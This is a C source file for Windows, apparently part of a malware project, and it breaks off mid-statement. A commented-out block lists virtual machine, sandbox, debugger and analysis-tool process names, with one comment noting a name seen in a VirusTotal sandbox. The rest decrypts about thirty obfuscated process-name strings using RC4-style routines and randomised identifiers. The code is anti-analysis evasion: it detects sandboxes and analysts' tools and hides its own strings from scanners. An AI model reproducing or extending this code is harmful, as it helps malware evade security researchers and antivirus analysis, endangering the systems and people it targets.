#include <windows.h>#include <tlhelp32.h>#include <psapi.h>#include <tchar.h>#include <stdio.h>#include "proxy_funck.c"/*#pragma comment(lib, "psapi.lib")*/BOOL itbgqAzczfksfbsknbf(const TCHAR* processName) {                 // Функция сравнивает имя процесса с отслеживаемыми/*const TCHAR* monitoredProcesses[] = {TEXT("VBoxTray.exe"),                   // Иконка VirtualBox в трее гостевой ОСTEXT("VBoxService.exe"),                // Служба VirtualBox Guest AdditionsTEXT("vboxservice.exe"),                // Альтернативное имя службы VirtualBoxTEXT("vboxguest.sys"),                  // Драйвер VirtualBox GuestTEXT("vmtoolsd.exe"),                   // VMware Tools daemonTEXT("vmwaretray.exe"),                 // VMware Tools tray iconTEXT("vmwareuser.exe"),                 // Пользовательский компонент VMware ToolsTEXT("vmsrvc.exe"),                     // VMware serviceTEXT("vmhgfs.sys"),                     // VMware shared folders driverTEXT("vmware-vmx.exe"),                 // Основной процесс виртуальной машины VMwareTEXT("vmware-authd.exe"),               // Процесс авторизации VMware.TEXT("vmicvss.exe"),                    // Компонент, который управляет виртуальными машинами в Hyper-VTEXT("vmmem.exe"),                      // Процесс, связанный с памятью виртуальной машины в Hyper-VTEXT("vmwp.exe"),                       // Процесс виртуальной машины, который работает в рамках Hyper-VTEXT("qemu-system-x86_64.exe"),         // Основной процесс для запуска виртуальных машин в QEMUTEXT("qemu-vm-guest.exe"),              // Процесс, связанный с виртуализированными гостямиTEXT("prl_vm_app.exe"),                 // Основной процесс для работы виртуальных машин в Parallels DesktopTEXT("prl_tools.exe"),                  // Процесс, связанный с Parallels Tools, используемый для интеграции гостевой операционной системы и хостовой системыTEXT("prl_cc.exe"),                     // Parallels WorkstationTEXT("SharedIntApp.exe"),               // Parallels WorkstationTEXT("vmmouse.sys"),                    // Драйвер мыши виртуальной машиныTEXT("xenservice.exe"),                 // Xen Virtualization environmentTEXT("WindowsSandbox.exe"),             // Parallels Tools (для macOS/Parallels Desktop)TEXT("SandboxieRpcSs.exe"),             // Sandboxie RPC serviceTEXT("SandboxieDcomLaunch.exe"),        // Sandboxie COM LaunchTEXT("SbieSvc.exe"),                    // Основная служба SandboxieTEXT("SbieCtrl.exe"),                   // Контроллер Sandboxie (GUI)TEXT("SxIn.exe"),                       // Comodo SandboxTEXT("procmon.exe"),                    // Process Monitor — анализ поведенияTEXT("VmRemoteGuest.exe"),              // Обнаружил в процесах одной из песочниц VirusTotalTEXT("ntsd.exe"),                       // Windows Debugging ToolsTEXT("windbg.exe"),                     // Windows Debugging ToolsTEXT("idaq.exe"),                       // IDA ProTEXT("idag.exe"),                       // IDA ProTEXT("x64dbg.exe"),TEXT("x32dbg.exe"),};*/unsigned char wcxboYpjtwv[] = {0x69, 0xDD, 0x54, 0x7C, 0x6D, 0x67, 0x3E, 0x4A, 0x32, 0x27, 0x4D, 0xC5,'\0'};int fvydtPrrewl = 256;unsigned char ffbeyWyfxqzzbizj[] = {'d','p','m','l','y','Q','g','n','u','y','h','j','j','u','m','r','z','g','\0'};unsigned char xylqsQxifowlqwvtnl[fvydtPrrewl];size_t wbkghZqmsn = strlen((char *)wcxboYpjtwv);size_t tzfkcSdaxbqjzl = strlen((char *)ffbeyWyfxqzzbizj);nksxeOvdofmfwyszq(xylqsQxifowlqwvtnl, ffbeyWyfxqzzbizj, tzfkcSdaxbqjzl);oekdvTucorbxoxey(wcxboYpjtwv, wbkghZqmsn, xylqsQxifowlqwvtnl);const TCHAR process1_utka[sizeof(wcxboYpjtwv)];memcpy(process1_utka, wcxboYpjtwv, wbkghZqmsn + 1);unsigned char aorupUezcfufeqkqksp[] = {0xC3, 0x27, 0x7F, 0xF9, 0xBF, 0xF8, 0x33, 0xD4, 0xE8, 0xA4, 0x46, 0x9D, 0x26, 0xAD, 0x48,'\0'};int sdyflScczvak = 256;unsigned char hdedtHdncoeuqpyub[] = {'i','q','x','y','f','P','d','u','i','j','z','j','m','k','i','\0'};unsigned char quxtqRysshqey[sdyflScczvak];size_t hdwaoQsbriq = strlen((char *)aorupUezcfufeqkqksp);size_t wafhnGknqtxewxzwbg = strlen((char *)hdedtHdncoeuqpyub);nksxeOvdofmfwyszq(quxtqRysshqey, hdedtHdncoeuqpyub, wafhnGknqtxewxzwbg);oekdvTucorbxoxey(aorupUezcfufeqkqksp, hdwaoQsbriq, quxtqRysshqey);const TCHAR process2_utka[sizeof(aorupUezcfufeqkqksp)];memcpy(process2_utka, aorupUezcfufeqkqksp, hdwaoQsbriq + 1);unsigned char lslwqHnonfsw[] = {0xEC, 0x3F, 0xDD, 0x13, 0x60, 0xF5, 0x35, 0x13, 0x74, 0x52, 0x2E, 0xF4, 0x46, 0x59, 0x49,'\0'};int apwnkKargrigg = 256;unsigned char jpacbNojanhgkvg[] = {'n','x','l','c','a','O','i','m','a','f','\0'};unsigned char uriviNsooqv[apwnkKargrigg];size_t dgynuFiiqzvwrztb = strlen((char *)lslwqHnonfsw);size_t swyfkJwnrxtox = strlen((char *)jpacbNojanhgkvg);nksxeOvdofmfwyszq(uriviNsooqv, jpacbNojanhgkvg, swyfkJwnrxtox);oekdvTucorbxoxey(lslwqHnonfsw, dgynuFiiqzvwrztb, uriviNsooqv);const TCHAR process3_utka[sizeof(lslwqHnonfsw)];memcpy(process3_utka, lslwqHnonfsw, dgynuFiiqzvwrztb + 1);unsigned char bctyqOslaq[] = {0x70, 0x24, 0x89, 0x05, 0xF3, 0xFD, 0xA2, 0xC0, 0x17, 0xBF, 0x2F, 0xCB, 0x30,'\0'};int kavwwQsccyakdyxhpyvh = 256;unsigned char naqnjCqenka[] = {'n','o','j','l','g','U','b','x','j','c','u','\0'};unsigned char rlkcjZncqh[kavwwQsccyakdyxhpyvh];size_t jwwnnNylelpytscfcuiv = strlen((char *)bctyqOslaq);size_t xuowaPcysutafkne = strlen((char *)naqnjCqenka);nksxeOvdofmfwyszq(rlkcjZncqh, naqnjCqenka, xuowaPcysutafkne);oekdvTucorbxoxey(bctyqOslaq, jwwnnNylelpytscfcuiv, rlkcjZncqh);const TCHAR process4_utka[sizeof(bctyqOslaq)];memcpy(process4_utka, bctyqOslaq, jwwnnNylelpytscfcuiv + 1);unsigned char bvhxnShgnmzqr[] = {0x0A, 0xE9, 0xDC, 0x6E, 0x89, 0x6B, 0x9C, 0xA8, 0x4C, 0x9F, 0xE3, 0x60,'\0'};int thsfsYgvvlt = 256;unsigned char cnfmcGmqgkcdxcdey[] = {'d','w','s','i','y','W','y','a','y','v','g','f','i','j','u','\0'};unsigned char cbnnkDurrutc[thsfsYgvvlt];size_t tcrwzLtyige = strlen((char *)bvhxnShgnmzqr);size_t xyfycJuukbqrg = strlen((char *)cnfmcGmqgkcdxcdey);nksxeOvdofmfwyszq(cbnnkDurrutc, cnfmcGmqgkcdxcdey, xyfycJuukbqrg);oekdvTucorbxoxey(bvhxnShgnmzqr, tcrwzLtyige, cbnnkDurrutc);const TCHAR process5_utka[sizeof(bvhxnShgnmzqr)];memcpy(process5_utka, bvhxnShgnmzqr, tcrwzLtyige + 1);unsigned char ewyyiNjzija[] = {0x21, 0x2C, 0x57, 0xD0, 0x3E, 0x08, 0x1F, 0xE0, 0xBE, 0xA3, 0x87, 0x3E, 0x1A, 0x2C,'\0'};int zyodqJhnuiwtzpyuwwj = 256;unsigned char mclfbShiihkvmkbawdcm[] = {'p','x','n','t','d','V','n','v','z','s','i','i','p','\0'};unsigned char jmmrrTjkfdloq[zyodqJhnuiwtzpyuwwj];size_t mnfynYqvjmqufohbqahd = strlen((char *)ewyyiNjzija);size_t lmotpNtrfq = strlen((char *)mclfbShiihkvmkbawdcm);nksxeOvdofmfwyszq(jmmrrTjkfdloq, mclfbShiihkvmkbawdcm, lmotpNtrfq);oekdvTucorbxoxey(ewyyiNjzija, mnfynYqvjmqufohbqahd, jmmrrTjkfdloq);const TCHAR process6_utka[sizeof(ewyyiNjzija)];memcpy(process6_utka, ewyyiNjzija, mnfynYqvjmqufohbqahd + 1);unsigned char xzmwpXwdazrh[] = {0x80, 0x07, 0xF0, 0x3A, 0x88, 0x32, 0xFD, 0x41, 0x4F, 0x8A, 0xBE, 0x68, 0xE7, 0xE7,'\0'};int bxmcmXclistlq = 256;unsigned char fzjhyXyhtvzomsquel[] = {'n','y','q','v','v','H','t','h','d','c','m','o','n','u','t','s','b','k','\0'};unsigned char wbkhwDkutygsmboq[bxmcmXclistlq];size_t noiylZaldhlxgklwha = strlen((char *)xzmwpXwdazrh);size_t ltdnbHxundiujc = strlen((char *)fzjhyXyhtvzomsquel);nksxeOvdofmfwyszq(wbkhwDkutygsmboq, fzjhyXyhtvzomsquel, ltdnbHxundiujc);oekdvTucorbxoxey(xzmwpXwdazrh, noiylZaldhlxgklwha, wbkhwDkutygsmboq);const TCHAR process7_utka[sizeof(xzmwpXwdazrh)];memcpy(process7_utka, xzmwpXwdazrh, noiylZaldhlxgklwha + 1);unsigned char boextAkgcitlletok[] = {0xD6, 0xA8, 0x0A, 0x60, 0x0A, 0xAE, 0x87, 0x34, 0x12, 0x98,'\0'};int xvtlxYisdu = 256;unsigned char ulrcaOqpyp[] = {'s','r','m','i','n','D','t','u','b','d','l','q','t','l','\0'};unsigned char mutewJtdduvh[xvtlxYisdu];size_t pupgiYhejlbhnnblkd = strlen((char *)boextAkgcitlletok);size_t bdgwsDgtcfoblxaukdzd = strlen((char *)ulrcaOqpyp);nksxeOvdofmfwyszq(mutewJtdduvh, ulrcaOqpyp, bdgwsDgtcfoblxaukdzd);oekdvTucorbxoxey(boextAkgcitlletok, pupgiYhejlbhnnblkd, mutewJtdduvh);const TCHAR process8_utka[sizeof(boextAkgcitlletok)];memcpy(process8_utka, boextAkgcitlletok, pupgiYhejlbhnnblkd + 1);unsigned char sbhpoXynakktzmt[] = {0xCA, 0x78, 0x48, 0x70, 0x13, 0xAE, 0x2B, 0xAF, 0xC7, 0x99,'\0'};int dzdvxNzvdajjzobt = 256;unsigned char quarqFzchgumhlwv[] = {'g','n','y','b','m','A','c','u','q','z','d','p','z','\0'};unsigned char vqrucAxpxxoltbllvhb[dzdvxNzvdajjzobt];size_t rllzeFplea = strlen((char *)sbhpoXynakktzmt);size_t lfemlNejiizhbahba = strlen((char *)quarqFzchgumhlwv);nksxeOvdofmfwyszq(vqrucAxpxxoltbllvhb, quarqFzchgumhlwv, lfemlNejiizhbahba);oekdvTucorbxoxey(sbhpoXynakktzmt, rllzeFplea, vqrucAxpxxoltbllvhb);const TCHAR process9_utka[sizeof(sbhpoXynakktzmt)];memcpy(process9_utka, sbhpoXynakktzmt, rllzeFplea + 1);unsigned char ivhjxRibdhkhfwliors[] = {0xE7, 0xF1, 0xF8, 0xB0, 0xEA, 0xBD, 0xDC, 0x71, 0xD5, 0xBB, 0xAE, 0x8C, 0x3D, 0x36,'\0'};int wmiwdXteqnzvslbl = 256;unsigned char lxfaeJwjeidsors[] = {'p','p','r','c','k','W','m','b','t','f','c','x','h','\0'};unsigned char omuriOjzjjdvxndse[wmiwdXteqnzvslbl];size_t rbkskVyejy = strlen((char *)ivhjxRibdhkhfwliors);size_t emxzjDnvcwtzhqzvy = strlen((char *)lxfaeJwjeidsors);nksxeOvdofmfwyszq(omuriOjzjjdvxndse, lxfaeJwjeidsors, emxzjDnvcwtzhqzvy);oekdvTucorbxoxey(ivhjxRibdhkhfwliors, rbkskVyejy, omuriOjzjjdvxndse);const TCHAR process10_utka[sizeof(ivhjxRibdhkhfwliors)];memcpy(process10_utka, ivhjxRibdhkhfwliors, rbkskVyejy + 1);unsigned char afchuAeooidqxhu[] = {0xE0, 0x7C, 0x50, 0xEB, 0x98, 0xBB, 0xF7, 0xA0, 0x5E, 0x46, 0xDB, 0x0D, 0xD2, 0xB5, 0xAD, 0xC5,'\0'};int ysmkbFtera = 256;unsigned char njbsmSnyfivglek[] = {'v','v','n','b','m','U','y','k','l','a','r','e','k','p','z','k','\0'};unsigned char eixqxLpppvukaozgdk[ysmkbFtera];size_t bivbsJqteisyhzby = strlen((char *)afchuAeooidqxhu);size_t zotsfCdoyyizxowvzq = strlen((char *)njbsmSnyfivglek);nksxeOvdofmfwyszq(eixqxLpppvukaozgdk, njbsmSnyfivglek, zotsfCdoyyizxowvzq);oekdvTucorbxoxey(afchuAeooidqxhu, bivbsJqteisyhzby, eixqxLpppvukaozgdk);const TCHAR process11_utka[sizeof(afchuAeooidqxhu)];memcpy(process11_utka, afchuAeooidqxhu, bivbsJqteisyhzby + 1);unsigned char hyitpQmoalybdkxnoww[] = {0xA5, 0xE2, 0xF0, 0xED, 0x05, 0xF3, 0x0D, 0xFC, 0xDC, 0x45, 0xC8,'\0'};int ocrmpAdbjijdne = 256;unsigned char dhowqClqwiwezvgb[] = {'u','f','t','k','e','G','n','x','e','v','m','i','\0'};unsigned char qwlsyDgmdidajrcwdr[ocrmpAdbjijdne];size_t lsompMnmcapxy = strlen((char *)hyitpQmoalybdkxnoww);size_t gyrkiPqppiqwttw = strlen((char *)dhowqClqwiwezvgb);nksxeOvdofmfwyszq(qwlsyDgmdidajrcwdr, dhowqClqwiwezvgb, gyrkiPqppiqwttw);oekdvTucorbxoxey(hyitpQmoalybdkxnoww, lsompMnmcapxy, qwlsyDgmdidajrcwdr);const TCHAR process12_utka[sizeof(hyitpQmoalybdkxnoww)];memcpy(process12_utka, hyitpQmoalybdkxnoww, lsompMnmcapxy + 1);unsigned char dcwcoQkcslul[] = {0x27, 0xCE, 0xDB, 0x8E, 0xE0, 0x94, 0xA8, 0x55, 0xE4,'\0'};int jlasaLchscmsql = 256;unsigned char oiwjgRgqloszmnkbvgud[] = {'r','t','o','h','d','V','x','e','c','q','f','\0'};unsigned char lmvxiWcojv[jlasaLchscmsql];size_t tblkwVcmyqikamptrvt = strlen((char *)dcwcoQkcslul);size_t yupleGnonhh = strlen((char *)oiwjgRgqloszmnkbvgud);nksxeOvdofmfwyszq(lmvxiWcojv, oiwjgRgqloszmnkbvgud, yupleGnonhh);oekdvTucorbxoxey(dcwcoQkcslul, tblkwVcmyqikamptrvt, lmvxiWcojv);const TCHAR process14_utka[sizeof(dcwcoQkcslul)];memcpy(process14_utka, dcwcoQkcslul, tblkwVcmyqikamptrvt + 1);unsigned char idtctTjcyvg[] = {0xAB, 0xF3, 0x8B, 0x11, 0xE0, 0xB4, 0xE1, 0xC9,'\0'};int bhcynDaoiizhszeeee = 256;unsigned char fxwofIsbhazoetylab[] = {'w','y','d','q','c','B','k','z','n','w','w','z','h','\0'};unsigned char gzfomWbkpqugmsckm[bhcynDaoiizhszeeee];size_t zjtvvGgmafgbzhflcffs = strlen((char *)idtctTjcyvg);size_t qzavuVazqhqxxjat = strlen((char *)fxwofIsbhazoetylab);nksxeOvdofmfwyszq(gzfomWbkpqugmsckm, fxwofIsbhazoetylab, qzavuVazqhqxxjat);oekdvTucorbxoxey(idtctTjcyvg, zjtvvGgmafgbzhflcffs, gzfomWbkpqugmsckm);const TCHAR process15_utka[sizeof(idtctTjcyvg)];memcpy(process15_utka, idtctTjcyvg, zjtvvGgmafgbzhflcffs + 1);unsigned char tgwkmWpvyymh[] = {0xC2, 0x6B, 0x10, 0xB4, 0x83, 0x22, 0x84, 0x22, 0xD4, 0x0F, 0xC1, 0x70, 0xF0, 0x06, 0x41, 0x36, 0xC9, 0x59, 0xA8, 0x8D, 0x69, 0xCA,'\0'};int gekkbDxcthugr = 256;unsigned char yeesyIbgafeatqx[] = {'k','z','o','i','x','T','w','k','e','o','e','\0'};unsigned char ejgyqBfrnbkxkigf[gekkbDxcthugr];size_t yxyrnAtmsmatwrkiko = strlen((char *)tgwkmWpvyymh);size_t buwnsZlihg = strlen((char *)yeesyIbgafeatqx);nksxeOvdofmfwyszq(ejgyqBfrnbkxkigf, yeesyIbgafeatqx, buwnsZlihg);oekdvTucorbxoxey(tgwkmWpvyymh, yxyrnAtmsmatwrkiko, ejgyqBfrnbkxkigf);const TCHAR process16_utka[sizeof(tgwkmWpvyymh)];memcpy(process16_utka, tgwkmWpvyymh, yxyrnAtmsmatwrkiko + 1);unsigned char offbtHrfeilhchkjm[] = {0x8E, 0x56, 0x0C, 0x20, 0x72, 0x7D, 0xAF, 0x56, 0x60, 0x02, 0xCF, 0x2B, 0xC1, 0x83, 0x65, 0x72, 0x85,'\0'};int kmfkrTlwhasbx = 256;unsigned char kywtoPwiodlqrohc[] = {'r','t','z','v','w','F','a','h','n','u','e','p','q','e','b','i','v','\0'};unsigned char pbzoiNfiacidxhsvfjj[kmfkrTlwhasbx];size_t nufhjZpkncubvmqlwcqh = strlen((char *)offbtHrfeilhchkjm);size_t slbssYlipirojqr = strlen((char *)kywtoPwiodlqrohc);nksxeOvdofmfwyszq(pbzoiNfiacidxhsvfjj, kywtoPwiodlqrohc, slbssYlipirojqr);oekdvTucorbxoxey(offbtHrfeilhchkjm, nufhjZpkncubvmqlwcqh, pbzoiNfiacidxhsvfjj);const TCHAR process17_utka[sizeof(offbtHrfeilhchkjm)];memcpy(process17_utka, offbtHrfeilhchkjm, nufhjZpkncubvmqlwcqh + 1);unsigned char gpqomDdadkpk[] = {0x54, 0xAD, 0x05, 0x6C, 0x31, 0xC1, 0xCE, 0x0A, 0xF7, 0xFA, 0x68, 0x52, 0x7D, 0x68,'\0'};int oqylgMdmer = 256;unsigned char hjpteIwznvcgkm[] = {'z','u','l','q','y','M','p','j','z','t','j','b','o','z','q','\0'};unsigned char icpbgIrcah[oqylgMdmer];size_t fjdvwIzzvbgw = strlen((char *)gpqomDdadkpk);size_t snfulQfzoegmsqtieiyy = strlen((char *)hjpteIwznvcgkm);nksxeOvdofmfwyszq(icpbgIrcah, hjpteIwznvcgkm, snfulQfzoegmsqtieiyy);oekdvTucorbxoxey(gpqomDdadkpk, fjdvwIzzvbgw, icpbgIrcah);const TCHAR process18_utka[sizeof(gpqomDdadkpk)];memcpy(process18_utka, gpqomDdadkpk, fjdvwIzzvbgw + 1);unsigned char iccqjCcukusdogase[] = {0x92, 0x75, 0x77, 0xB6, 0x30, 0xDE, 0x26, 0x80, 0xF7, 0xD3, 0xBB, 0x90, 0xC1,'\0'};int tvfvdPctkmsbilhvpy = 256;unsigned char fnyopCgrdcceawmhvc[] = {'e','l','s','x','t','S','j','c','n','e','d','k','h','s','s','r','k','c','\0'};unsigned char vawimOqjzjjxqlwdh[tvfvdPctkmsbilhvpy];size_t atnnpQxidpkhxnojkmhx = strlen((char *)iccqjCcukusdogase);size_t tukgsSbvjscvyng = strlen((char *)fnyopCgrdcceawmhvc);nksxeOvdofmfwyszq(vawimOqjzjjxqlwdh, fnyopCgrdcceawmhvc, tukgsSbvjscvyng);oekdvTucorbxoxey(iccqjCcukusdogase, atnnpQxidpkhxnojkmhx, vawimOqjzjjxqlwdh);const TCHAR process19_utka[sizeof(iccqjCcukusdogase)];memcpy(process19_utka, iccqjCcukusdogase, atnnpQxidpkhxnojkmhx + 1);unsigned char ruqorNhfejg[] = {0x3A, 0xC0, 0xFA, 0xE8, 0xF2, 0x10, 0xF7, 0xDA, 0xD2, 0x9D,'\0'};int bvehmKhelaxwf = 256;unsigned char kozydYdamq[] = {'j','d','r','v','f','T','t','m','r','q','v','k','z','g','c','d','w','\0'};unsigned char bajydOzrwkacyixzloc[bvehmKhelaxwf];size_t zhvnaHakgwcirkmkzgaa = strlen((char *)ruqorNhfejg);size_t zlvfsObzjlbajilbg = strlen((char *)kozydYdamq);nksxeOvdofmfwyszq(bajydOzrwkacyixzloc, kozydYdamq, zlvfsObzjlbajilbg);oekdvTucorbxoxey(ruqorNhfejg, zhvnaHakgwcirkmkzgaa, bajydOzrwkacyixzloc);const TCHAR process20_utka[sizeof(ruqorNhfejg)];memcpy(process20_utka, ruqorNhfejg, zhvnaHakgwcirkmkzgaa + 1);unsigned char izvblZkxxalhclrhai[] = {0x22, 0xC2, 0x31, 0xC8, 0x24, 0xD2, 0x0E, 0x84, 0x52, 0x29, 0x46, 0x28, 0xA1, 0xEA, 0xAE, 0x81,'\0'};int qtzpoKdjcxl = 256;unsigned char tejcfRjdauuwodzb[] = {'j','j','i','i','y','J','k','a','f','u','g','u','h','q','y','o','l','n','i','c','\0'};unsigned char yikmpYrosxnerqx[qtzpoKdjcxl];size_t sqflmDxvpdismmseuks = strlen((char *)izvblZkxxalhclrhai);size_t uyybsTcfnqsibegwsau = strlen((char *)tejcfRjdauuwodzb);nksxeOvdofmfwyszq(yikmpYrosxnerqx, tejcfRjdauuwodzb, uyybsTcfnqsibegwsau);oekdvTucorbxoxey(izvblZkxxalhclrhai, sqflmDxvpdismmseuks, yikmpYrosxnerqx);const TCHAR process21_utka[sizeof(izvblZkxxalhclrhai)];memcpy(process21_utka, izvblZkxxalhclrhai, sqflmDxvpdismmseuks + 1);unsigned char jwwdkLvjhvaszcnq[] = {0xE0, 0x6C, 0xE4, 0x7A, 0xBB, 0xAD, 0x55, 0x41, 0x5C, 0x88, 0xD0,'\0'};int jfvepBdtwyzkkv = 256;unsigned char cegrnUuupfbfqdcdapy[] = {'w','k','c','d','x','Z','c','c','t','a','k','g','p','x','c','w','f','\0'};unsigned char togctAfesxxj[jfvepBdtwyzkkv];size_t byvvgFpiveblq = strlen((char *)jwwdkLvjhvaszcnq);size_t hoggaCrhonhd = strlen((char *)cegrnUuupfbfqdcdapy);nksxeOvdofmfwyszq(togctAfesxxj, cegrnUuupfbfqdcdapy, hoggaCrhonhd);oekdvTucorbxoxey(jwwdkLvjhvaszcnq, byvvgFpiveblq, togctAfesxxj);const TCHAR process22_utka[sizeof(jwwdkLvjhvaszcnq)];memcpy(process22_utka, jwwdkLvjhvaszcnq, byvvgFpiveblq + 1);unsigned char qrrqoUyqoiwhnxra[] = {0x8C, 0x23, 0x3B, 0x03, 0x71, 0x75, 0xAF, 0x62, 0x08, 0x6A, 0xFE, 0x65, 0xAD, 0x16,'\0'};int fhhguNmlnhljmlx = 256;unsigned char aybtvNmxxj[] = {'j','t','e','v','h','I','h','r','b','k','l','j','y','k','r','l','m','b','\0'};unsigned char dcjiqUxqlmdb[fhhguNmlnhljmlx];size_t rssqeEpefbwdx = strlen((char *)qrrqoUyqoiwhnxra);size_t ehuxuVzcqumgctuuqrgc = strlen((char *)aybtvNmxxj);nksxeOvdofmfwyszq(dcjiqUxqlmdb, aybtvNmxxj, ehuxuVzcqumgctuuqrgc);oekdvTucorbxoxey(qrrqoUyqoiwhnxra, rssqeEpefbwdx, dcjiqUxqlmdb);const TCHAR process23_utka[sizeof(qrrqoUyqoiwhnxra)];memcpy(process23_utka, qrrqoUyqoiwhnxra, rssqeEpefbwdx + 1);unsigned char hlurkNbflvmpq[] = {0xD2, 0xBC, 0x3A, 0x6E, 0x3F, 0x3B, 0x4D, 0x1E, 0x34, 0xD8, 0x93, 0xBD, 0x8F, 0x2F, 0x88, 0x08, 0x17, 0xE9,'\0'};int zahcsYgileadqopuaw = 256;unsigned char zocogGvsgawcvk[] = {'r','r','n','r','s','L','h','n','z','h','e','k','z','s','o','s','q','\0'};unsigned char dgoveFfagfzffoghb[zahcsYgileadqopuaw];size_t ykuwzJmmsog = strlen((char *)hlurkNbflvmpq);size_t gokuvZzpdop = strlen((char *)zocogGvsgawcvk);nksxeOvdofmfwyszq(dgoveFfagfzffoghb, zocogGvsgawcvk, gokuvZzpdop);oekdvTucorbxoxey(hlurkNbflvmpq, ykuwzJmmsog, dgoveFfagfzffoghb);const TCHAR process24_utka[sizeof(hlurkNbflvmpq)];memcpy(process24_utka, hlurkNbflvmpq, ykuwzJmmsog + 1);unsigned char djxroAkseugcrdtyeg[] = {0x7A, 0x2E, 0xB1, 0xC6, 0xDC, 0x9E, 0x6D, 0xD9, 0x2B, 0xDF, 0x9B, 0x8C, 0x93, 0xB8, 0xD9, 0x38, 0x69, 0x23,'\0'};int tqvpxWslrzgxaqhuprvx = 256;unsigned char tiatqQbkbcea[] = {'f','o','d','g','k','C','v','f','p','y','\0'};unsigned char apxfwRnaompnrkd[tqvpxWslrzgxaqhuprvx];size_t tdsdbUnzuxrtadyh = strlen((char *)djxroAkseugcrdtyeg);size_t dybpjLrkqwyilwjnx = strlen((char *)tiatqQbkbcea);nksxeOvdofmfwyszq(apxfwRnaompnrkd, tiatqQbkbcea, dybpjLrkqwyilwjnx);oekdvTucorbxoxey(djxroAkseugcrdtyeg, tdsdbUnzuxrtadyh, apxfwRnaompnrkd);const TCHAR process25_utka[sizeof(djxroAkseugcrdtyeg)];memcpy(process25_utka, djxroAkseugcrdtyeg, tdsdbUnzuxrtadyh + 1);unsigned char hnpssOpqwarqnltvlble[] = {0x3A, 0xEB, 0xEC, 0x96, 0x39, 0x14, 0x92, 0x94, 0x07, 0xFC, 0x82, 0xC3, 0x6A, 0xDE, 0x15, 0xBF, 0x3A, 0x67, 0xDC, 0x8C, 0xD0, 0xC5, 0x05,'\0'};int jeeevGmqzeddbmmwm = 256;unsigned char vnjcxKezzbk[] = {'b','t','y','i','p','H','a','j','p','o','j','i','\0'};unsigned char ckhjxMdrqiiaoaafpwr[jeeevGmqzeddbmmwm];size_t xaxfuGgjhljkma = strlen((char *)hnpssOpqwarqnltvlble);size_t muunnEulhhwf = strlen((char *)vnjcxKezzbk);nksxeOvdofmfwyszq(ckhjxMdrqiiaoaafpwr, vnjcxKezzbk, muunnEulhhwf);oekdvTucorbxoxey(hnpssOpqwarqnltvlble, xaxfuGgjhljkma, ckhjxMdrqiiaoaafpwr);const TCHAR process26_utka[sizeof(hnpssOpqwarqnltvlble)];memcpy(process26_utka, hnpssOpqwarqnltvlble, xaxfuGgjhljkma + 1);unsigned char nhzkfWahhbhwtwrdooz[] = {0x02, 0x42, 0x39, 0xC2, 0xD1, 0x0C, 0x80, 0x4A, 0xAE, 0x7C, 0x7F,'\0'};int zjgmkWfsvz = 256;unsigned char ohvwoQfqmgvtuoebvr[] = {'w','p','c','c','v','X','k','z','g','b','t','j','t','z','\0'};unsigned char qwiiaSnpkxyoyeg[zjgmkWfsvz];size_t vbnwzWawgjlrbifron = strlen((char *)nhzkfWahhbhwtwrdooz);size_t ofnyeNdvzxcyz = strlen((char *)ohvwoQfqmgvtuoebvr);nksxeOvdofmfwyszq(qwiiaSnpkxyoyeg, ohvwoQfqmgvtuoebvr, ofnyeNdvzxcyz);oekdvTucorbxoxey(nhzkfWahhbhwtwrdooz, vbnwzWawgjlrbifron, qwiiaSnpkxyoyeg);const TCHAR process27_utka[sizeof(nhzkfWahhbhwtwrdooz)];memcpy(process27_utka, nhzkfWahhbhwtwrdooz, vbnwzWawgjlrbifron + 1);unsigned char cqpyiSfjvlmvle[] = {0x87, 0xC7, 0x65, 0xA2, 0x99, 0xEF, 0x56, 0x49, 0xCE, 0xC5, 0x1E, 0x6E,'\0'};int zwoqrVaoqvixasgnih = 256;unsigned char iofgwOcahrgo[] = {'m','s','q','t','t','R','l','b','h','l','l','w','x','\0'};unsigned char bymqiVpcslnmcupp[zwoqrVaoqvixasgnih];size_t caoaqOunvod = strlen((char *)cqpyiSfjvlmvle);size_t hzdceUmtxnxmazdgub = strlen((char *)iofgwOcahrgo);nksxeOvdofmfwyszq(bymqiVpcslnmcupp, iofgwOcahrgo, hzdceUmtxnxmazdgub);oekdvTucorbxoxey(cqpyiSfjvlmvle, caoaqOunvod, bymqiVpcslnmcupp);const TCHAR process28_utka[sizeof(cqpyiSfjvlmvle)];memcpy(process28_utka, cqpyiSfjvlmvle, caoaqOunvod + 1);unsigned char ovobeIlhmzvhxlrb[] = {0x4D, 0x84, 0x91, 0x36, 0x4E, 0x6E, 0x49, 0x2D,'\0'};int yulpvNvjuosftgqhg = 256;unsigned char oqharCfihkbqjuhhyr[] = {'k','n','u','t','t','X','o','w','i','b','z','h','z','o','j','\0'};unsigned char gytezFrtcpooqtyvc[yulpvNvjuosftgqhg];size_t cpmwbDheuc = strlen((char *)ovobeIlhmzvhxlrb);size_t bnxtwWfhmxcheevkmhk = strlen((char *)oqharCfihkbqjuhhyr);nksxeOvdofmfwyszq(gytezFrtcpooqtyvc, oqharCfihkbqjuhhyr, bnxtwWfhmxcheevkmhk);oekdvTucorbxoxey(ovobeIlhmzvhxlrb, cpmwbDheuc, gytezFrtcpooqtyvc);const TCHAR process29_utka[sizeof(ovobeIlhmzvhxlrb)];memcpy(process29_utka, ovobeIlhmzvhxlrb, cpmwbDheuc + 1);unsigned char roysoRaceteaeyi[] = {0xDF, 0xFA, 0x14, 0x7C, 0xED, 0xC9, 0x4C, 0xF0, 0xEF, 0x25, 0x58,'\0'};int dbuhpLpajwyjqgn = 256;unsigned char grbpiWsmmqdmrfmbwln[] = {'b','u','a','i','a','U','q','q','n','t','\0'};unsigned char gkvvrNndfvpn[dbuhpLpajwyjqgn];size_t bzqrgTmtktdpnkonyjg = strlen((char *)roysoRaceteaeyi);size_t ajiqnEquhiupynldfy = strlen((char *)grbpiWsmmqdmrfmbwln);nksxeOvdofmfwyszq(gkvvrNndfvpn, grbpiWsmmqdmrfmbwln, ajiqnEquhiupynldfy);oekdvTucorbxoxey(roysoRaceteaeyi, bzqrgTmtktdpnkonyjg, gkvvrNndfvpn);const TCHAR process30_utka[sizeof(roysoRaceteaeyi)];memcpy(process30_utka, roysoRaceteaeyi, bzqrgTmtktdpnkonyjg + 1);unsigned char fpcorPbykjqmfbum[] = {0x4E, 0x9E, 0x4F, 0xD8, 0xB8, 0x63, 0xEC, 0x28, 0x2B, 0xF4, 0xC0, 0x79, 0x01, 0x11, 0x2D, 0x9B, 0x14,'\0'};int uedqzCnzscxhwfur = 256;unsigned char dgguzBzvpclpj[] = {'w','k','b','f','x','P','m','t','q','c','x','s','\0'};unsigned char ejjroIcuopkmffrqn[uedqzCnzscxhwfur];size_t kvsmbArbjttsoeurhl = strlen((char *)fpcorPbykjqmfbum);size_t 